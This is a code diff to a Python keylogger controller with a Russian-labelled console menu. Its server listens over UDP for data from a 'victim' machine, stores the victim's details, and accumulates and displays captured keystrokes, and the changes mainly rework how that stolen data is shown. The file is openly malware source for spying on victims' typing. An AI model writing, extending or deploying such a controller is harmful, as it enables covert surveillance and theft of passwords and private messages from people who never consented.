@@ -16,6 +16,7 @@ import time
 # import keyboard
 from pynput.keyboard import Listener, Key
 
+line = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 banner = """
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         ┃
@@ -87,23 +88,24 @@ class ControllerServer:
                         self.ip_victim = ip_victim
                         self.send_command(message="Server_active")
                         self.info_victim = data_str
-                        print(self.info_victim)
-                        # self.buffer += data_str
+                        # print(line)
+                        # print(self.info_victim)
+                        # print(line)
                         continue
 
                     if signal:
                         self.buffer += data_str
-                        os.system('clear')
-                        print("\033[32m" + banner + "\033[0m")
-                        print(self.info_victim)
-                        print(f"UDP server listening on {self.ip_victim}:{self.port_listen} (press Ctrl+C to stop)")
-                        print("Keystroke operation ->", self.buffer)
-                        print("Enter 'stop' to stop, 'exit' to quit... ->")
+                        # os.system('clear')
+                        # print("\033[32m" + banner + "\033[0m")
+                        # print(self.info_victim)
+                        # print(f"UDP server listening on {self.ip_victim}:{self.port_listen} (press Ctrl+C to stop)")
+                        # print("Keystroke operation ->", self.buffer)
+                        # print("Enter 'stop' to stop, 'exit' to quit... ->")
                     else:
-                        os.system('clear')
-                        print("\033[32m" + banner + "\033[0m")
+                        # os.system('clear')
+                        # print("\033[32m" + banner + "\033[0m")
                         self.buffer = ""
-                        print("Stopped. Enter 'start' to restart monitoring, 'exit' to quit... ->")
+                        # print("Stopped. Enter 'start' to restart monitoring, 'exit' to quit... ->")
                 except socket.timeout as e:
                     continue
                 except json.JSONDecodeError as e:
@@ -154,6 +156,9 @@ class ConsoleMenu:
         footer = "↑↓ Переключить пункт • Enter Подтвердить"
         padding = (menu_width - len(footer)) // 2
         print("┃" + " " * padding + footer + " " * padding + " ┃")
+        #print("┗" + "━" * menu_width + "┛")
+        print("┣" + "━" * menu_width + "┫")
+        print(controller.info_victim)
         print("┗" + "━" * menu_width + "┛")
         print(controller.buffer)
     
@@ -186,8 +191,6 @@ class ConsoleMenu:
             self.running = False
 
     def on_press(self, key):
-        self.clear_screen()
-        self.draw_menu()
         try:
             if key == Key.up:
                 self.current_selection = (self.current_selection - 1) % len(self.options)
@@ -195,13 +198,15 @@ class ConsoleMenu:
                 self.current_selection = (self.current_selection + 1) % len(self.options)
             elif key == Key.enter:
                 self.execute_selection()
+            self.clear_screen()
+            self.draw_menu()
         except AttributeError:
             pass
 
     def on_release(self, key):
         try:
             if key == Key.esc or not self.running:
-                self.running = False
+                exit()
                 return False
         except AttributeError:
             pass
